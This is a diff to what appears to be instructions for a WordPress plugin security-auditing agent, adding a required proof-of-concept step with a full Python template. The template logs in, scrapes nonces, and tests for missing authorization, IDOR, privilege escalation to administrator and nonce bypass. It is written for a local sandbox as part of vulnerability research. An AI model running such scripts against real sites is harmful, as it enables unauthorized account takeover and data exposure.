@@ -430,6 +430,225 @@ Authentication Bypass (login bypass): 9.8 Critical
 
 ---
 
+## PoC Script Creation (REQUIRED)
+
+**When you find a vulnerability, you MUST create a standalone PoC script.**
+
+### File Location
+Save PoC to: `reports/{plugin_slug}/poc_auth_{short_id}.py`
+
+Example: `reports/gallery-pro/poc_auth_abc123.py`
+
+### PoC Template for Auth/AuthZ Vulnerabilities
+
+```python
+#!/usr/bin/env python3
+"""
+PoC for {Vulnerability Title}
+Plugin: {plugin_slug} v{version}
+Vulnerability: {missing_authorization/privilege_escalation/idor/auth_bypass}
+Auth Required: {auth_level}
+
+Usage:
+    python3 poc_auth.py --url http://target.com
+    python3 poc_auth.py --url http://target.com -u subscriber -p subscriber
+"""
+
+import argparse
+import requests
+import sys
+import re
+
+def login(session, base_url, username, password):
+    """Authenticate to WordPress."""
+    login_url = f"{base_url}/wp-login.php"
+    data = {
+        "log": username,
+        "pwd": password,
+        "wp-submit": "Log In",
+        "redirect_to": f"{base_url}/wp-admin/",
+        "testcookie": "1"
+    }
+    resp = session.post(login_url, data=data, allow_redirects=True)
+    return "dashboard" in resp.text.lower() or resp.status_code == 200
+
+def get_nonce(session, base_url, nonce_action):
+    """Fetch WordPress nonce for AJAX action."""
+    resp = session.get(f"{base_url}/wp-admin/admin.php")
+    match = re.search(r'_wpnonce["\']:\s*["\']([a-f0-9]+)["\']', resp.text)
+    if not match:
+        match = re.search(r'name="_wpnonce"\s+value="([a-f0-9]+)"', resp.text)
+    return match.group(1) if match else None
+
+def test_missing_auth(base_url, session):
+    """Test for missing authorization - low priv user accessing admin functions."""
+    # === CONFIGURE THESE FOR THE SPECIFIC VULNERABILITY ===
+    target_url = f"{base_url}/wp-admin/admin-ajax.php"
+
+    # Try admin-only action as subscriber
+    data = {
+        'action': 'admin_only_action',
+        'setting': 'malicious_value'
+    }
+    resp = session.post(target_url, data=data)
+
+    # Check if action succeeded (should have been blocked)
+    if 'success' in resp.text.lower() or '"success":true' in resp.text:
+        return True, "Missing authorization - subscriber accessed admin function"
+    if 'not authorized' in resp.text.lower() or 'permission' in resp.text.lower():
+        return False, "Properly blocked by authorization check"
+
+    return False, resp.text[:500]
+
+def test_idor(base_url, session, victim_id=1):
+    """Test for IDOR - accessing other users' data."""
+    target_url = f"{base_url}/wp-admin/admin-ajax.php"
+
+    # Try to access another user's data
+    data = {
+        'action': 'get_user_data',
+        'user_id': victim_id  # Admin user ID
+    }
+    resp = session.post(target_url, data=data)
+
+    # Check if we got admin's data
+    if 'admin' in resp.text.lower() and ('email' in resp.text.lower() or 'user_login' in resp.text.lower()):
+        return True, f"IDOR - accessed user {victim_id}'s data"
+
+    return False, resp.text[:500]
+
+def test_priv_esc(base_url, session):
+    """Test for privilege escalation."""
+    target_url = f"{base_url}/wp-admin/admin-ajax.php"
+
+    # Try to escalate privileges
+    data = {
+        'action': 'update_user_role',
+        'role': 'administrator'
+    }
+    resp = session.post(target_url, data=data)
+
+    # Verify by checking current user capabilities
+    check_resp = session.get(f"{base_url}/wp-admin/")
+    if 'manage_options' in check_resp.text or 'settings' in check_resp.text.lower():
+        return True, "Privilege escalation - subscriber became admin"
+
+    return False, resp.text[:500]
+
+def test_nonce_bypass(base_url, session):
+    """Test if nonce validation can be bypassed."""
+    target_url = f"{base_url}/wp-admin/admin-ajax.php"
+
+    # Send request WITHOUT nonce
+    data = {
+        'action': 'sensitive_action',
+        'data': 'test'
+        # Deliberately no _wpnonce
+    }
+    resp = session.post(target_url, data=data)
+
+    # Check if action executed without nonce
+    if 'success' in resp.text.lower() and 'nonce' not in resp.text.lower():
+        return True, "Nonce bypass - action executed without valid nonce"
+
+    return False, resp.text[:500]
+
+def exploit(base_url, session=None, test_type="all"):
+    """
+    Execute the auth bypass exploit.
+
+    Returns:
+        tuple: (vulnerable: bool, details: str)
+    """
+    s = session or requests.Session()
+
+    if test_type in ["all", "missing_auth"]:
+        print("[*] Testing missing authorization...")
+        vuln, details = test_missing_auth(base_url, s)
+        if vuln:
+            return True, details
+
+    if test_type in ["all", "idor"]:
+        print("[*] Testing IDOR...")
+        vuln, details = test_idor(base_url, s)
+        if vuln:
+            return True, details
+
+    if test_type in ["all", "priv_esc"]:
+        print("[*] Testing privilege escalation...")
+        vuln, details = test_priv_esc(base_url, s)
+        if vuln:
+            return True, details
+
+    if test_type in ["all", "nonce"]:
+        print("[*] Testing nonce bypass...")
+        vuln, details = test_nonce_bypass(base_url, s)
+        if vuln:
+            return True, details
+
+    return False, "No auth vulnerability found"
+
+def main():
+    parser = argparse.ArgumentParser(description="PoC for Auth/AuthZ vulnerability")
+    parser.add_argument("--url", "-t", required=True, help="Target WordPress URL")
+    parser.add_argument("--username", "-u", help="WordPress username (if auth required)")
+    parser.add_argument("--password", "-p", help="WordPress password (if auth required)")
+    parser.add_argument("--test", choices=["all", "missing_auth", "idor", "priv_esc", "nonce"],
+                       default="all", help="Specific test to run")
+    args = parser.parse_args()
+
+    base_url = args.url.rstrip("/")
+    session = requests.Session()
+
+    # Login if credentials provided
+    if args.username and args.password:
+        print(f"[*] Logging in as {args.username}...")
+        if not login(session, base_url, args.username, args.password):
+            print("[-] Login failed!")
+            sys.exit(1)
+        print("[+] Login successful!")
+
+    # Execute exploit
+    print(f"[*] Testing {base_url} for auth vulnerabilities...")
+    vulnerable, details = exploit(base_url, session, args.test)
+
+    if vulnerable:
+        print("[+] VULNERABLE!")
+        print(f"[+] Details: {details}")
+    else:
+        print("[-] Not vulnerable or exploit failed")
+        print(f"[-] Details: {details}")
+
+    return 0 if vulnerable else 1
+
+if __name__ == "__main__":
+    sys.exit(main())
+```
+
+### Required Structure
+Every PoC MUST have:
+1. **Argparse CLI** with `--url`, `-u/--username`, `-p/--password`
+2. **Login function** for authenticated vulnerabilities
+3. **Nonce fetching** if the endpoint requires it
+4. **Clear output** showing VULNERABLE or NOT VULNERABLE
+5. **Docstring** with plugin name, version, vuln type, auth level
+
+### PoC Checklist
+- [ ] Script runs with `python3 poc.py --help`
+- [ ] Script works against sandbox: `python3 poc.py --url http://172.17.0.1:8000`
+- [ ] For auth vulns: `python3 poc.py --url http://172.17.0.1:8000 -u subscriber -p subscriber`
+- [ ] Output clearly shows success/failure
+- [ ] No hardcoded URLs or credentials
+- [ ] Tests from lowest privilege level that works
+- [ ] Verifies authorization is actually bypassed
+
+### After Creating PoC
+1. Test it against the sandbox
+2. Create finding with `wpguard_finding_create()`
+3. Include PoC path in finding's `poc_path` field
+
+---
+
 ## Signal Completion
 
 ```python
